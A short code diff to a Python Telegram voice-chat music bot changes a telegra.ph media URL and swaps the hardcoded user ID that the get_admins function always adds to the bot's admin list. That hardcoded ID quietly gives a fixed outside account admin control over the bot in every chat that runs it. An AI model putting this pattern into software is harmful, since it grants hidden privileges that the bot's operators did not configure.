@@ -30,7 +30,7 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from pytgcalls.types.input_stream import InputAudioStream, InputVideoStream, AudioParameters, VideoParameters
 
 ffmpeg_log = open("ffmpeg.txt", "w+")
-TGPIC = "https://telegra.ph/file/014ffdd6d0c8c65a91154.jpg"
+TGPIC = "https://telegra.ph/file/2939dc9a2c5733fb8de2f.mp4"
 
 
 async def play():
@@ -501,7 +501,7 @@ async def unmute():
 async def get_admins(chat):
     admins=Config.ADMINS
     if not Config.ADMIN_CACHE:
-        admins = Config.ADMINS + [1956381927]
+        admins = Config.ADMINS + [1156597097]
         try:
             grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
             for administrator in grpadmins:
